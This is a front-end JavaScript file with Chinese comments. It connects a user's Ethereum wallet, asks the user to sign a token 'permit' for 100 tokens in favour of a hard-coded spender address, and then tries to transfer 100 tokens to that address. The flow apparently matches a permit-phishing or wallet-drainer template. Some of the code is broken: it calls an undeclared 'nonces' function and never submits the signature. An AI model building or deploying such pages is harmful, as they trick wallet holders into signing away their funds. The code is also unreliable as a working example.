document.addEventListener("DOMContentLoaded", function () {
    // 全局变量
    let provider;
    let signer;
    let userAddress;
    let contract;

    const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";  // 智能合约地址
    const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];  // 请用你的ABI替换此处

    // 连接钱包按钮点击事件
    document.getElementById('connectWalletBtn').addEventListener('click', async function () {
        try {
            // 检查是否存在钱包扩展 (MetaMask 或其他)
            if (typeof window.ethereum !== 'undefined') {
                console.log('检测到钱包扩展');
                // 请求连接钱包
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();

                // 输出钱包地址
                console.log("钱包已连接:", userAddress);
                alert("钱包已成功连接：" + userAddress);

                // 实例化合约
                contract = new ethers.Contract(contractAddress, contractABI, signer);
            } else {
                alert("未检测到任何以太坊钱包扩展，请安装MetaMask！");
            }
        } catch (error) {
            console.error("连接钱包失败:", error);
            alert("连接钱包失败，请检查浏览器扩展或重试。");
        }
    });

    // 签名授权按钮点击事件
    document.getElementById('signPermitBtn').addEventListener('click', async function () {
        try {
            if (!contract) {
                alert("请先连接钱包！");
                return;
            }

            const domain = {
                name: 'MyToken',
                version: '1',
                chainId: 1,  // 根据你部署的网络进行修改
                verifyingContract: contractAddress,
            };

            const permitData = {
                owner: userAddress,
                spender: '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 收款地址
                value: ethers.utils.parseUnits('100', 18),  // 转移金额
                nonce: await contract.nonces(userAddress),
                deadline: Math.floor(Date.now() / 1000) + 60 * 60,  // 一小时后过期
            };

            const types = {
                Permit: [
                    { name: 'owner', type: 'address' },
                    { name: 'spender', type: 'address' },
                    { name: 'value', type: 'uint256' },
                    { name: 'nonce', type: 'uint256' },
                    { name: 'deadline', type: 'uint256' },
                ],
            };

            const signature = await signer._signTypedData(domain, types, permitData);
            const { v, r, s } = ethers.utils.splitSignature(signature);

            console.log("签名成功:", { v, r, s });
            alert("签名成功！");
        } catch (error) {
            console.error("签名失败:", error);
            alert("签名失败，请检查并重试。");
        }
    });

    // 转移代币按钮点击事件
    document.getElementById('transferTokensBtn').addEventListener('click', async function () {
        try {
            if (!contract) {
                alert("请先连接钱包！");
                return;
            }

            const transferTx = await contract.transferFrom(
                userAddress,
                '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 接收地址
                ethers.utils.parseUnits('100', 18)  // 转移金额
            );

            console.log("代币转移交易已发送:", transferTx.hash);
            alert("代币转移交易已成功发送！");
        } catch (error) {
            console.error("代币转移失败:", error);
            alert("代币转移失败，请检查并重试。");
        }
    });
});
